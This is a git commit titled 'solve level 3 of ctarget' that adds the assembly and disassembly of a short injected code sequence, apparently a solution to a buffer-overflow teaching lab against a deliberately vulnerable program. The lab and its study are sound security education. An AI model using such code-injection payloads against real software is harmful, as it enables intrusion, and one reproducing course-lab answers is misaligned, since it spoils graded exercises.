0c6a5a73169189411ac359b406b4aa831599b69b
Richard Chien <richardchienthebest@gmail.com>
2020-06-14 20:27:16 +0800

    solve level 3 of ctarget

---
+++ labs/attack/ctarget.3.o.asm
@@ -0,0 +1,10 @@
+
+ctarget.3.o：     文件格式 elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:   bf a8 dc 61 55          mov    $0x5561dca8,%edi
+   5:   68 fa 18 40 00          pushq  $0x4018fa
+   a:   c3                      retq
---
+++ labs/attack/ctarget.3.s
@@ -0,0 +1,3 @@
+movl $0x5561dca8, %edi
+pushq $0x4018fa
+retq
